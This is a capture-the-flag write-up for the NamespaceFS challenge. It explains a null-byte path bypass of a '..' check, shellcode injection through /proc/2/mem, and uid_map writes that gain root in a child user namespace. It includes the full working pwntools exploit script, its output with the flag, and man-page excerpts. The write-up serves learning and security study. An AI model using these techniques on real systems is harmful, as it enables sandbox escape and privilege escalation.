# NamespaceFS

**Problem Description:** 

> A remote filesystem with protobufs and namespace-based security. You can find the flag at /home/user/flag (read-only by root)<br>
>
> [Attachment](./f8634094e0c28f5fe74a1d2f3fee2e0cfbbab1f0909e385a6f8db7fe28d3bf4907c984f3895de53455a12fa29e7ad360620db9c37f833e2ffc3957f4cbe96b49)<br>
>
> `namespacefs.2020.ctfcompetition.com 1337`

## Solution

The zipped attachment contained the following files:

- [init](./init)
- [init.c](./init.c)
- [Makefile](./Makefile)
- [nsfs.cc](./nsfs.cc)
- [nsfs.proto](./nsfs.proto)

### TODO

Talk about:

- The program(s), how they worked and what they did
- How breadsticks quickly noticed we can write to files outside of `/tmp/` by using a path with a null-terminator
  - Thanks to the program using `strstr` on `path.c_str()` when checking for `..`
- How this let us write to `init`'s memory (`/proc/2/mem`) to execute code we wanted (flashback to `writeonly` challenge)
- How this still wasn't good enough to read `/home/user/flag` as `init`'s `r/e/suid` was `1338` and not `0` (root)
- How I noticed root was being mapped into `init`'s user namespace as root (`write_xidmap(sandboxPid, "uid_map", {0, kUnprivUid});`)
- How we can't just `setresuid(0, 0, 0)` in `init` because `init` was `execl`'d
- How I noticed:
  1. We can instead make `init` clone with a new user namespace
  2. Map root into the user namespace of the child of `init`
  3. Then have `init`'s child `setresuid` to root and read flag
- Why the protobuf process had to map root into `init`'s child as opposed to `init` itself

### Exploit

Thus, the following [exploit](./solve.py) was crafted:

```python
import nsfs_pb2 as nsfs
from time import sleep
from pwn import *

context.arch = "amd64"

CLONE_NEWUSER = 0x10000000

def send_write(io, path, data, offset=0):
    msg = nsfs.Operation(
        action=nsfs.WRITE,
        path=path,
        data=data,
        offset=offset).SerializeToString()
    io.send(p32(len(msg)) + msg)

if __name__ == "__main__":
    patch = asm(""
        + shellcraft.clone(CLONE_NEWUSER)
        + "test eax, eax\n"
        + "je child\n"
        + shellcraft.infloop()
        + "child:\n"
        + "push 0\n"
        + "push 3\n"
        + shellcraft.nanosleep("rsp")
        + shellcraft.setresuid(0, 0, 0)
        + shellcraft.cat("/home/user/flag")
    )
    io = remote("namespacefs.2020.ctfcompetition.com", 1337)
    send_write(io, "x\0/../../proc/2/mem", patch, 0x401b9b)
    sleep(1.5)
    send_write(io, "x\0/../../proc/4/uid_map", b"0 0 1\n")
    send_write(io, "x\0/../../proc/4/gid_map", b"0 0 1\n")
    io.interactive()
```

**Note:** `protoc --python_out=. nsfs.proto` must be run before running the exploit, to generate `nsfs_pb2.py`

### Flag

```bash
$ python3 solve.py
[+] Opening connection to namespacefs.2020.ctfcompetition.com on port 1337: Done
[*] Switching to interactive mode
write success
write success
write success
CTF{every_year_these_silly_namespaces}
```

### Q&A

The walls of text were taken from [here](https://www.man7.org/linux/man-pages/man7/user_namespaces.7.html).

**Q:** Did you have to `setresuid(0, 0, 0)` as opposed to some other number in `init`'s child?

**A:** Nope, I did not have to. `setresuid(other_num, other_num, other_num)` would have worked just as fine, as long as we wrote `other_num 0 1` to `init`'s child's `uid_map` instead.

**Q:** Why can `init` not `setresuid` to root?

**A:** Due to the following:

```
Note that a call to execve(2) will cause a process's capabilities to
be recalculated in the usual way (see capabilities(7)).
Consequently, unless the process has a user ID of 0 within the
namespace, or the executable file has a nonempty inheritable
capabilities mask, the process will lose all capabilities.
```

**Q:** Why can `init`'s child `setresuid` to root (once root is mapped)?

**A:** Due to the following:

```
The child process created by clone(2) with the CLONE_NEWUSER flag
starts out with a complete set of capabilities in the new user
namespace.
```

**Q:** Why can `init` not map root to its child's user namespace but the protobuf process can?

**A:**  Firstly, remember that `init` has `r/e/suid = 1338` and lost all its capabilities thanks to the `execl`. Then, remember that the protobuf process:

1. Attaches on to `init`'s user namespace (the parent user namespace of `init`'s child)
2. Still has `r/e/suid = 0` in `init`'s user namespace
3. Therefore, it also has `CAP_SETUID` set in `init`'s namespace

Now, please suffer through the following wall of text (like I once had to :smile:):

```
In order for a process to write to the /proc/[pid]/uid_map
(/proc/[pid]/gid_map) file, all of the following requirements must be
met:

1. The writing process must have the CAP_SETUID (CAP_SETGID) capabil‐
  ity in the user namespace of the process pid.

2. The writing process must either be in the user namespace of the
  process pid or be in the parent user namespace of the process pid.

3. The mapped user IDs (group IDs) must in turn have a mapping in the
  parent user namespace.

4. One of the following two cases applies:

  *  Either the writing process has the CAP_SETUID (CAP_SETGID)
     capability in the parent user namespace.

     +  No further restrictions apply: the process can make mappings
        to arbitrary user IDs (group IDs) in the parent user names‐
        pace.

  *  Or otherwise all of the following restrictions apply:

     +  The data written to uid_map (gid_map) must consist of a sin‐
        gle line that maps the writing process's effective user ID
        (group ID) in the parent user namespace to a user ID (group
        ID) in the user namespace.

     +  The writing process must have the same effective user ID as
        the process that created the user namespace.

     +  In the case of gid_map, use of the setgroups(2) system call
        must first be denied by writing "deny" to the
        /proc/[pid]/setgroups file (see below) before writing to
        gid_map.

Writes that violate the above rules fail with the error EPERM.
```

**Q:** Is this exploit possible if root wasn't mapped into `init`'s user namespace?

**A:** I believe this exploit would not have worked if root was not mapped into `init`'s user namespace. As, per the above wall of text, root would not be in the parent's (`init`'s) user namespace for us to be able to map it into the child's user namespace.